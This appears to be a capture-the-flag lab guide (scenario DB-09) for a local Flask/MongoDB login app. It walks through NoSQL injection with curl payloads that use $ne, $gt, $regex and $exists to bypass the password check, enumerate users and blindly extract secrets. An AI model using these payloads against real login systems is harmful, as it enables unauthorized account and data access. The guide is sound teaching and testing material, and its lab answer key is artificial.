# DB-09: MongoDB NoSQL Injection

## 场景信息

| 字段 | 值 |
|---|---|
| ID | DB-09 |
| 名称 | MongoDB NoSQL Injection |
| 技术/CVE | N/A (NoSQL injection) |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10209 |

## 场景概述
- 技术：N/A (NoSQL injection)
- 难度：L2
- 交付方式：docker
- 入口端口：10209
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | NoSQL Injection (MongoDB $ne Operator) |
| Difficulty | L2 |
| Port | 10209 |
| Path | scenarios/db/mongodb-nosqli/ |
| Type | docker |
| Database | MongoDB 7.0 + Python Flask |

### Attack Path Summary
```
Identify JSON login endpoint → Inject $ne operator to bypass password check → Authentication bypass → Retrieve admin user document containing flag
```

### Prerequisites

#### Knowledge
- NoSQL injection principles: Understanding how JSON-based injection differs from SQL injection, particularly with MongoDB query operators
- MongoDB query operators: Knowledge of `$ne` (not equal), `$gt` (greater than), `$regex`, and other operators that match all documents
- JSON injection: Injecting MongoDB operators into JSON request bodies to manipulate query logic
- Flask/Python web applications: Understanding how Python web apps parse JSON request bodies and pass them directly to MongoDB queries

#### Tools
- curl: Sending crafted JSON POST requests to the login endpoint
- Burp Suite: Intercepting requests, replaying them, and using Repeater for iterative testing

### Step-by-Step Exploitation

#### Step 1: Access the Login Page

Open the application login page to understand the authentication mechanism.

```bash
curl http://localhost:10209/
```

#### Step 2: Test Normal Login

Attempt a login with random credentials to confirm the endpoint exists and understand the expected request format.

```bash
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'
```

Expected response: `{"error": "Invalid credentials"}` or similar.

#### Step 3: Inject $ne to Bypass Password

Send a JSON payload where the `password` field is a MongoDB `$ne` (not equal) operator injected as an object. This transforms the server-side query from:

```javascript
db.users.findOne({username: "admin", password: "attacker_input"})
```

into:

```javascript
db.users.findOne({username: "admin", password: {"$ne": ""}})
```

Since `$ne: ""` matches any document where the password is not equal to an empty string (which is always true for non-empty passwords), the query returns the admin user without knowing the actual password.

```bash
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'
```

#### Step 4: Retrieve the Flag

If the login succeeds, the flag is returned in the response body (either directly as a field in the user document or in a session token).

```json
{"message": "Login successful", "flag": "flag{db-09-xxxxxxxxxxxxxxxx}", "user": "admin"}
```

#### Step 5: Try Other Operators if $ne is Filtered

If `$ne` is blocked by input validation, try alternative operators:

```bash
# $gt — matches any value greater than empty string (all non-empty strings)
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

# $regex — matches any string pattern
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}'

# $exists — matches documents where password field exists
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$exists":true}}'
```

#### Step 6: Extract All Users via $ne on Username

If the flag is not in the admin document directly, enumerate all users by bypassing both fields:

```bash
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```

This returns the first user matching any non-empty credentials, potentially revealing all users.

#### Step 7: Blind Extraction via Boolean-Based NoSQL Injection

If the application returns different responses for valid vs. invalid conditions, perform blind extraction of the password hash or flag character by character using `$regex`:

```bash
# Test if password starts with 'f'
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^f"}}'

# Test if password starts with 'fl'
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^fl"}}'
```

Each request that returns a success response indicates the regex pattern matched.

### Flag Location
- Stored as a field within the admin user document in MongoDB
- Retrieved by bypassing authentication via NoSQL injection and reading the returned user document

### Verification Commands
```bash
curl -s -X POST http://localhost:10209/login -H "Content-Type: application/json" -d '{"username":"admin","password":{"$ne":""}}' | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | MongoDB-backed login API and JSON query syntax |
| 侦察与前置条件 | Authentication query construction and operator injection behavior |
| 核心漏洞与利用 | Use a NoSQL operator such as $ne to bypass authentication |
| 权限、横向或影响 | Unauthorized application/database access |
| 验证 | Access the privileged data containing the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
